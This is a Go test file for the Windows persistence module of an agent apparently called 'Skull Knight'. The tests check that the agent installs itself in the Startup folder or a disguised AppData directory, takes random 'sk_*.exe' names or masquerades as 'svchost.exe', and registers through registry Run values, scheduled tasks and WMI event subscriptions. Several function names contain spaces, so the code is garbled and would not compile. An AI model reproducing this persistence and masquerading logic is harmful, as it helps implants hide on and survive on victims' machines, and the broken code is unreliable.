//go:build windows
// +build windows

package persistence

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/sys/windows/registry"
)

func TestGetTargetPath_UsesStartupFolderAndRandomizedOvdName(t *testing.T) {
	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath failed: %v", err)
	}

	wantDir := filepath.Join(appData, startupFolderRelative)
	if !strings.EqualFold(filepath.Clean(filepath.Dir(got)), filepath.Clean(wantDir)) {
		t.Fatalf("expected dir %q, got %q", wantDir, filepath.Dir(got))
	}
	base := strings.ToLower(filepath.Base(got))
	if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
		t.Fatalf("expected randomized sk_*.exe name, got %q", filepath.Base(got))
	}
}

func TestGetTargetPath_PrefersExistingPrefixedExecutable(t *testing.T) {
	appData := t.TempDir()
	t.Setenv("APPDATA", appData)
	startupDir := filepath.Join(appData, startupFolderRelative)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		t.Fatalf("mkdir startup dir failed: %v", err)
	}

	expected := filepath.Join(startupDir, "sk_existing.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write startup executable failed: %v", err)
	}

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath failed: %v", err)
	}

	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected existing startup executable %q, got %q", expected, got)
	}
}

func TestIsSkull KnightRunValueName(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want bool
	}{
		{name: "Legacy", in: "Skull KnightAgent", want: true},
		{name: "LegacyCaseInsensitive", in: "Skull Knightagent", want: true},
		{name: "Randomized", in: "Skull KnightAgent-a1b2c3d4e5f6", want: true},
		{name: "RandomizedCaseInsensitive", in: "Skull Knightagent-deadbeefcafe", want: true},
		{name: "OtherApp", in: "OneDrive", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isSkull KnightRunValueName(tt.in); got != tt.want {
				t.Fatalf("isSkull KnightRunValueName(%q)=%v, want %v", tt.in, got, tt.want)
			}
		})
	}
}

func TestGetTargetPath_NonStartupMethodsUseAppDataBinaryDir(t *testing.T) {
	origFns := persistInstallFns
	origHas := hasStartupMethod
	t.Cleanup(func() {
		persistInstallFns = origFns
		hasStartupMethod = origHas
	})

	// Simulate a non-startup method registered (e.g. registry).
	hasStartupMethod = false
	persistInstallFns = []func(string) error{func(string) error { return nil }}

	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath() error: %v", err)
	}
	wantDir := filepath.Join(appData, appDataBinaryDir)
	if !strings.EqualFold(filepath.Clean(filepath.Dir(got)), filepath.Clean(wantDir)) {
		t.Fatalf("expected dir %q, got %q", wantDir, filepath.Dir(got))
	}
	base := strings.ToLower(filepath.Base(got))
	if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
		t.Fatalf("expected sk_*.exe name, got %q", filepath.Base(got))
	}
}

func TestGetTargetPath_StartupMethodTakesPriorityOverOthers(t *testing.T) {
	origFns := persistInstallFns
	origHas := hasStartupMethod
	t.Cleanup(func() {
		persistInstallFns = origFns
		hasStartupMethod = origHas
	})

	// Simulate startup + another method both registered.
	hasStartupMethod = true
	persistInstallFns = []func(string) error{
		func(string) error { return nil },
		func(string) error { return nil },
	}

	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath() error: %v", err)
	}
	wantDir := filepath.Join(appData, startupFolderRelative)
	if !strings.EqualFold(filepath.Clean(filepath.Dir(got)), filepath.Clean(wantDir)) {
		t.Fatalf("expected startup dir %q, got %q", wantDir, filepath.Dir(got))
	}
}

func TestGetTargetPath_PrefersExistingBinary_AppDataDir(t *testing.T) {
	origFns := persistInstallFns
	origHas := hasStartupMethod
	t.Cleanup(func() {
		persistInstallFns = origFns
		hasStartupMethod = origHas
	})
	hasStartupMethod = false
	persistInstallFns = []func(string) error{func(string) error { return nil }}

	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	dir := filepath.Join(appData, appDataBinaryDir)
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	expected := filepath.Join(dir, "sk_existing.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath() error: %v", err)
	}
	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected existing binary %q, got %q", expected, got)
	}
}

func TestGetTargetPath_MissingAPPDATA(t *testing.T) {
	t.Setenv("APPDATA", "")
	if _, err := getTargetPath(); err == nil {
		t.Fatal("expected error when APPDATA is empty, got nil")
	}
}

func TestDeriveTaskName_DeterministicAndPrefixed(t *testing.T) {
	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\sk_aabbccdd.exe`
	got1 := deriveTaskName(path)
	got2 := deriveTaskName(path)
	if got1 != got2 {
		t.Fatalf("deriveTaskName is not deterministic: %q vs %q", got1, got2)
	}
	if !strings.HasPrefix(got1, executablePrefix()) {
		t.Fatalf("task name %q does not have prefix %q", got1, executablePrefix())
	}
}

func TestDeriveTaskName_DifferentPathsDifferentNames(t *testing.T) {
	a := deriveTaskName(`C:\path\a\agent.exe`)
	b := deriveTaskName(`C:\path\b\agent.exe`)
	if a == b {
		t.Fatalf("expected distinct task names for distinct paths, both are %q", a)
	}
}

func TestDeriveTaskName_CaseInsensitive(t *testing.T) {
	lower := deriveTaskName(`c:\users\user\agent.exe`)
	upper := deriveTaskName(`C:\Users\User\Agent.exe`)
	if lower != upper {
		t.Fatalf("deriveTaskName should be case-insensitive: %q vs %q", lower, upper)
	}
}

func TestDeriveWMINames_DeterministicPrefixedAndDistinct(t *testing.T) {
	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\sk_aabbccdd.exe`
	f1, c1 := deriveWMINames(path)
	f2, c2 := deriveWMINames(path)
	if f1 != f2 || c1 != c2 {
		t.Fatalf("deriveWMINames not deterministic: filter %q!=%q or consumer %q!=%q", f1, f2, c1, c2)
	}
	if !strings.HasPrefix(f1, executablePrefix()) {
		t.Fatalf("filter name %q missing prefix %q", f1, executablePrefix())
	}
	if !strings.HasPrefix(c1, executablePrefix()) {
		t.Fatalf("consumer name %q missing prefix %q", c1, executablePrefix())
	}
	if f1 == c1 {
		t.Fatalf("filter and consumer names must differ, both are %q", f1)
	}
}

func TestDeriveWMINames_DifferentPaths(t *testing.T) {
	f1, c1 := deriveWMINames(`C:\path\a\agent.exe`)
	f2, c2 := deriveWMINames(`C:\path\b\agent.exe`)
	if f1 == f2 || c1 == c2 {
		t.Fatalf("expected distinct WMI names for distinct paths: filter %q==%q, consumer %q==%q", f1, f2, c1, c2)
	}
}

func TestGenerateBinaryName_FormatAndUniqueness(t *testing.T) {
	seen := make(map[string]bool)
	for i := 0; i < 20; i++ {
		name, err := generateBinaryName()
		if err != nil {
			t.Fatalf("generateBinaryName() error: %v", err)
		}
		lower := strings.ToLower(name)
		if !strings.HasPrefix(lower, executablePrefix()) {
			t.Fatalf("name %q missing prefix %q", name, executablePrefix())
		}
		if !strings.HasSuffix(lower, ".exe") {
			t.Fatalf("name %q missing .exe suffix", name)
		}
		if seen[lower] {
			t.Fatalf("generateBinaryName produced a duplicate in 20 iterations: %q", name)
		}
		seen[lower] = true
	}
}

func TestFindExistingBinaryInDir_EmptyDir(t *testing.T) {
	_, ok := findExistingBinaryInDir(t.TempDir())
	if ok {
		t.Fatal("expected false for empty dir, got true")
	}
}

func TestFindExistingBinaryInDir_FoundMatchingFile(t *testing.T) {
	dir := t.TempDir()
	expected := filepath.Join(dir, "sk_test.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	got, ok := findExistingBinaryInDir(dir)
	if !ok {
		t.Fatal("expected true, got false")
	}
	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected %q, got %q", expected, got)
	}
}

func TestFindExistingBinaryInDir_IgnoresNonMatchingFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "other_agent.exe"), []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	_, ok := findExistingBinaryInDir(dir)
	if ok {
		t.Fatal("expected false for non-prefixed file, got true")
	}
}

func TestFindExistingBinaryInDir_IgnoresDirectories(t *testing.T) {
	dir := t.TempDir()
	subdir := filepath.Join(dir, "sk_dir.exe")
	if err := os.Mkdir(subdir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	_, ok := findExistingBinaryInDir(dir)
	if ok {
		t.Fatal("expected false when only a directory matches the prefix, got true")
	}
}

func TestFindExistingBinaryInDir_NonexistentDir(t *testing.T) {
	_, ok := findExistingBinaryInDir(filepath.Join(t.TempDir(), "does_not_exist"))
	if ok {
		t.Fatal("expected false for nonexistent dir, got true")
	}
}

func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"sk_aabbcc.exe", "sk_112233.exe"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}
	keepers := []string{"other_app.exe", "system32.dll"}
	for _, name := range keepers {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}

	if err := cleanupPrefixedExecutables(dir); err != nil {
		t.Fatalf("cleanupPrefixedExecutables: %v", err)
	}

	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.HasPrefix(strings.ToLower(e.Name()), executablePrefix()) {
			t.Fatalf("sk_* file %q was not removed", e.Name())
		}
	}
	if got, want := len(entries), len(keepers); got != want {
		t.Fatalf("expected %d files remaining, got %d", want, got)
	}
}

func TestCleanupPrefixedExecutables_NonexistentDirReturnsNil(t *testing.T) {
	if err := cleanupPrefixedExecutables(filepath.Join(t.TempDir(), "nonexistent")); err != nil {
		t.Fatalf("expected nil for nonexistent dir, got %v", err)
	}
}

func TestCleanupSkull KnightRunValues_RemovesMatchingValues(t *testing.T) {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		t.Fatalf("open registry key: %v", err)
	}
	defer k.Close()

	toClean := []string{"Skull KnightAgent", "Skull KnightAgent-deadbeef", "Skull KnightAgent-cafebabe"}
	for _, name := range toClean {
		if err := k.SetStringValue(name, `"C:\dummy.exe"`); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}
	keepName := "SomeOtherAppNotSkull Knight"
	if err := k.SetStringValue(keepName, `"C:\other.exe"`); err != nil {
		t.Fatalf("write keeper: %v", err)
	}
	t.Cleanup(func() {
		_ = k.DeleteValue(keepName)
		for _, name := range toClean {
			_ = k.DeleteValue(name)
		}
	})

	if err := cleanupSkull KnightRunValues(k); err != nil {
		t.Fatalf("cleanupSkull KnightRunValues: %v", err)
	}

	for _, name := range toClean {
		if _, _, err := k.GetStringValue(name); err == nil {
			t.Errorf("expected %q to be deleted, but it still exists", name)
		}
	}
	if _, _, err := k.GetStringValue(keepName); err != nil {
		t.Fatalf("expected %q to remain, got error: %v", keepName, err)
	}
}

func TestGenerateBinaryName_CustomName_NoRandomSuffix(t *testing.T) {
	orig := DefaultStartupName
	t.Cleanup(func() { DefaultStartupName = orig })
	DefaultStartupName = "svchost"

	name, err := generateBinaryName()
	if err != nil {
		t.Fatalf("generateBinaryName() error: %v", err)
	}
	if name != "svchost.exe" {
		t.Fatalf("expected %q, got %q", "svchost.exe", name)
	}
}

func TestGenerateBinaryName_DefaultName_HasRandomSuffix(t *testing.T) {
	orig := DefaultStartupName
	t.Cleanup(func() { DefaultStartupName = orig })
	DefaultStartupName = ""

	name, err := generateBinaryName()
	if err != nil {
		t.Fatalf("generateBinaryName() error: %v", err)
	}
	if !strings.HasPrefix(name, "sk_") || !strings.HasSuffix(name, ".exe") || name == "sk_.exe" {
		t.Fatalf("expected sk_<hex>.exe, got %q", name)
	}
}

func TestFindExistingBinaryInDir_CustomName(t *testing.T) {
	orig := DefaultStartupName
	t.Cleanup(func() { DefaultStartupName = orig })
	DefaultStartupName = "myapp"

	dir := t.TempDir()
	expected := filepath.Join(dir, "myapp.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	// Also write an sk_ file that should NOT be matched
	if err := os.WriteFile(filepath.Join(dir, "sk_aabbcc.exe"), []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}

	got, ok := findExistingBinaryInDir(dir)
	if !ok {
		t.Fatal("expected true, got false")
	}
	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected %q, got %q", expected, got)
	}
}

func TestCleanupPrefixedExecutables_CustomName(t *testing.T) {
	orig := DefaultStartupName
	t.Cleanup(func() { DefaultStartupName = orig })
	DefaultStartupName = "myapp"

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "myapp.exe"), []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	// These should NOT be removed with the custom name set
	keepers := []string{"sk_aabbcc.exe", "other.exe"}
	for _, name := range keepers {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}

	if err := cleanupPrefixedExecutables(dir); err != nil {
		t.Fatalf("cleanupPrefixedExecutables: %v", err)
	}

	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.EqualFold(e.Name(), "myapp.exe") {
			t.Fatalf("custom-named file %q was not removed", e.Name())
		}
	}
	if got := len(entries); got != len(keepers) {
		t.Fatalf("expected %d files remaining, got %d", len(keepers), got)
	}
}

func TestGetTargetPath_CustomName(t *testing.T) {
	origMethod := DefaultPersistenceMethod
	origName := DefaultStartupName
	t.Cleanup(func() {
		DefaultPersistenceMethod = origMethod
		DefaultStartupName = origName
	})
	DefaultStartupName = "updater"

	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath failed: %v", err)
	}
	if filepath.Base(got) != "updater.exe" {
		t.Fatalf("expected updater.exe, got %q", filepath.Base(got))
	}
}
